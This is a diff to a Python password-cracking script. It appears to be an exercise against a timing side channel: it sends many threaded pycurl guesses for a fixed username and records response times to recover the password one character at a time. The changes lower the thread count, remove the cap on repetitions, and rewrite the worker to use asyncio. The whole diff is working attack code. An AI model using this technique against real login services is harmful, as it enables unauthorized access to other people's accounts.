@@ -6,6 +6,7 @@ from decimal import Decimal, getcontext
 import pycurl
 import io
 import threading
+import asyncio 
 
 _thread_local = threading.local()
 
@@ -22,7 +23,7 @@ USERNAME = "326529229" # need to recieve
 
 # since threads wait for a long long time for I/O
 # it is possible and wanted to have a lot of threads
-NUMBER_OF_THREADS = 100
+NUMBER_OF_THREADS = 60
 
 PASSWORD = ""
 LENGTH = -1
@@ -98,7 +99,7 @@ def num_repetitions(discovered_length):
     """
     global LENGTH
     # all times 1/internet speed slt
-    return min(100, discovered_length*DIFFICULTY + DIFFICULTY*DIFFICULTY)
+    return discovered_length*DIFFICULTY + DIFFICULTY*DIFFICULTY + 1
 
 
 def crack_next_char(discovered_length, executor):
@@ -110,8 +111,7 @@ def crack_next_char(discovered_length, executor):
     parts = split_charset()
     futures = []
     for round in range(r):
-        for part in parts:
-            futures.append(executor.submit(worker, part, discovered_length, counter))
+        futures.append(executor.submit(worker, discovered_length, counter))
     # Wait for all threads to complete
     # outside of the loop so that each round wont have to wait on 
     # the previous one to finish
@@ -120,17 +120,28 @@ def crack_next_char(discovered_length, executor):
     return counter.get_max_letter()
     
 
+def worker(discovered_length, counter):
+    """Sync wrapper that creates a local event loop to run the async func."""
+    loop = asyncio.new_event_loop()
+    try:
+        return loop.run_until_complete(check_CHARSET(discovered_length, counter))
+    finally:
+        loop.close()
 
-def worker(chars, discovered_length, counter):
+
+async def check_CHARSET(discovered_length, counter):
     global PASSWORD, LENGTH
+    # Get the current event loop
+    loop = asyncio.get_running_loop()
+    
     if LENGTH - discovered_length == 1:
-        for char in chars:
-            result = try_pass2(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
+        for char in CHARSET:
+            result = await loop.run_in_executor(None, try_pass2, PASSWORD + char + "a" * (LENGTH-discovered_length-1))
             if result.get("Data"):
                 counter.record_time(char, result.get("Time"))
     else:
-        for char in chars:
-            result = try_pass2(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
+        for char in CHARSET:
+            result = await loop.run_in_executor(None, try_pass2, PASSWORD + char + "a" * (LENGTH-discovered_length-1))
             counter.record_time(char, result.get("Time"))
 
 
